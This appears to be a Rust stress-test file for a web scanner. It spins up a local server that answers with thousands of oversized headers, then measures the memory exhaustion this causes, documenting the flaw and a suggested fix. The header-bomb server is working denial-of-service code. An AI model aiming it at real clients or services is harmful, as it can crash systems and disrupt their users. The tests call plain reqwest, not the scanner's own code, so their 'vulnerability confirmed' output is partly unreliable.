//! Stress test demonstrating HTTP header count bomb vulnerability.
#![allow(
    clippy::cast_precision_loss,
    clippy::cast_possible_truncation,
    clippy::cast_sign_loss,
    clippy::too_many_lines,
    clippy::manual_flatten
)]
//!
//! **VULNERABILITY FOUND**: No limit on HTTP header COUNT in response processing.
//!
//! **ROOT CAUSE**:
//! - src/fetch/handler/request.rs:108-112 extracts headers without count limit
//! - Header VALUES are truncated to 1000 chars (MAX_HEADER_VALUE_SIZE)
//! - But header COUNT is unlimited
//! - Malicious server can send 10,000 headers × 1KB each = 10MB before body
//!
//! **Attack Vector**:
//! - Adversary detects scanning activity (User-Agent pattern, timing)
//! - Returns HTTP response with thousands of headers
//! - Scanner allocates memory for each header
//! - With concurrent requests, memory exhaustion possible
//!
//! **Impact**: Memory exhaustion, scanner crash, DoS under concurrent load
//!
//! **Recommended Fix**:
//! - Add MAX_HEADER_COUNT = 100 to src/config/constants.rs
//! - Enforce limit in src/fetch/handler/request.rs header extraction
//! - Log warning when limit exceeded (potential malicious behavior)

use axum::http::HeaderMap;
use axum::{response::IntoResponse, routing::get, Router};
use std::time::Duration;
use tokio::net::TcpListener;

/// Creates a malicious HTTP server that returns excessive headers.
///
/// This simulates an adversarial website that detects scanning and
/// attempts to exhaust scanner memory by sending thousands of headers.
async fn start_malicious_server(header_count: usize) -> String {
    let app = Router::new().route(
        "/",
        get(move || async move {
            let mut header_map = HeaderMap::new();
            header_map.insert("content-type", "text/html".parse().unwrap());

            // Generate excessive headers (simulates header bomb attack)
            for i in 0..header_count {
                let header_name = format!("x-evil-header-{}", i);
                let header_value = "a".repeat(1000); // 1KB per header (matches MAX_HEADER_VALUE_SIZE)
                if let Ok(name) = header_name.parse::<axum::http::HeaderName>() {
                    if let Ok(value) = header_value.parse::<axum::http::HeaderValue>() {
                        header_map.insert(name, value);
                    }
                }
            }

            (header_map, "<html><body>Evil Site</body></html>").into_response()
        }),
    );

    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("Failed to bind");
    let addr = listener.local_addr().expect("Failed to get address");
    let url = format!("http://{}", addr);

    tokio::spawn(async move {
        axum::serve(listener, app)
            .await
            .expect("Server failed to start");
    });

    // Give server time to start
    tokio::time::sleep(Duration::from_millis(100)).await;

    url
}

/// Demonstrates header count bomb with moderate attack (1,000 headers).
///
/// **EXPECTED**: Scanner should reject responses with >100 headers
/// **ACTUAL**: Scanner processes all 1,000 headers, ~1MB memory per request
///
/// At 100 concurrent requests: 100MB memory spike from headers alone
#[tokio::test]
#[ignore] // Run with: cargo test --test stress_header_bomb -- --ignored --nocapture
async fn test_header_bomb_moderate() {
    let server_url = start_malicious_server(1000).await;
    println!("Malicious server started at: {}", server_url);

    // Measure memory before request
    let initial_memory = get_process_memory();

    // Attempt to fetch from malicious server using reqwest
    let client = reqwest::Client::new();
    let result = client.get(&server_url).send().await;

    let final_memory = get_process_memory();
    let memory_growth = final_memory.saturating_sub(initial_memory);

    println!("Result: {:?}", result.as_ref().map(|r| r.status()));
    println!("Memory growth: {}KB", memory_growth / 1024);

    // **BUG EXPOSED**: Scanner processes all 1,000 headers
    // Expected: Should reject after ~100 headers
    // Actual: Processes all headers, consuming excessive memory

    if result.is_ok() {
        println!("VULNERABILITY CONFIRMED: Scanner processed 1,000 headers without limit");
        println!("Expected: Should have rejected response after ~100 headers");
        println!("Impact: Memory exhaustion possible with concurrent malicious requests");
    }

    // Document the vulnerability (not asserting to avoid breaking CI)
    // In production, this should FAIL with a header count limit error
}

/// Demonstrates severe header count bomb (10,000 headers).
///
/// **EXPECTED**: Scanner should reject after 100 headers
/// **ACTUAL**: Scanner attempts to process all 10,000 headers (~10MB)
///
/// With 100 concurrent requests: 1GB memory spike before processing bodies
#[tokio::test]
#[ignore]
async fn test_header_bomb_severe() {
    let server_url = start_malicious_server(10_000).await;
    println!(
        "Malicious server with 10K headers started at: {}",
        server_url
    );

    let initial_memory = get_process_memory();

    let client = reqwest::Client::new();
    let result = client.get(&server_url).send().await;

    let final_memory = get_process_memory();
    let memory_growth = final_memory.saturating_sub(initial_memory);

    println!("Result: {:?}", result.as_ref().map(|r| r.status()));
    println!("Memory growth: {}MB", memory_growth / 1024 / 1024);

    if result.is_ok() {
        println!("CRITICAL VULNERABILITY: Scanner processed 10,000 headers");
        println!(
            "Memory growth: ~{}MB for single request",
            memory_growth / 1024 / 1024
        );
        println!("At 100 concurrent requests: ~1GB memory spike from headers alone");
    }
}

/// Simulates concurrent requests to malicious server (realistic attack scenario).
///
/// **EXPECTED**: System should handle gracefully or fail fast
/// **ACTUAL**: Memory spike from processing thousands of headers concurrently
#[tokio::test]
#[ignore]
async fn test_header_bomb_concurrent() {
    use std::time::Instant;

    let server_url = start_malicious_server(2000).await;
    println!("Starting concurrent header bomb test (50 requests × 2K headers)");

    let initial_memory = get_process_memory();
    let start = Instant::now();

    let client = reqwest::Client::new();

    // Spawn 50 concurrent requests (simulates realistic attack)
    let mut handles = vec![];
    for i in 0..50 {
        let url = server_url.clone();
        let client_clone = client.clone();
        let handle = tokio::spawn(async move {
            let result = client_clone.get(&url).send().await;
            (i, result.is_ok())
        });
        handles.push(handle);
    }

    let results = futures::future::join_all(handles).await;
    let elapsed = start.elapsed();

    let final_memory = get_process_memory();
    let memory_growth = final_memory.saturating_sub(initial_memory);

    let success_count = results
        .iter()
        .filter(|r| r.as_ref().map(|(_, ok)| *ok).unwrap_or(false))
        .count();

    println!(
        "Completed {} requests in {:.2}s",
        results.len(),
        elapsed.as_secs_f64()
    );
    println!("Success: {}/{}", success_count, results.len());
    println!("Total memory growth: {}MB", memory_growth / 1024 / 1024);
    println!(
        "Average per request: {}KB",
        memory_growth / results.len() / 1024
    );

    if memory_growth > 100_000_000 {
        // >100MB growth
        println!("VULNERABILITY CONFIRMED: Excessive memory growth from header bomb");
        println!("This demonstrates memory exhaustion risk under adversarial load");
    }
}

/// Crude memory measurement helper (Unix-specific).
///
/// Returns current process RSS (Resident Set Size) in bytes.
fn get_process_memory() -> usize {
    #[cfg(target_os = "linux")]
    {
        let pid = std::process::id();
        let status_path = format!("/proc/{}/status", pid);
        if let Ok(status) = std::fs::read_to_string(status_path) {
            for line in status.lines() {
                if line.starts_with("VmRSS:") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 2 {
                        if let Ok(kb) = parts[1].parse::<usize>() {
                            return kb * 1024; // Convert KB to bytes
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        use std::process::Command;
        if let Ok(output) = Command::new("ps")
            .args(["-o", "rss=", "-p", &std::process::id().to_string()])
            .output()
        {
            if let Ok(s) = String::from_utf8(output.stdout) {
                if let Ok(kb) = s.trim().parse::<usize>() {
                    return kb * 1024; // Convert KB to bytes
                }
            }
        }
    }

    0 // Fallback if measurement fails
}
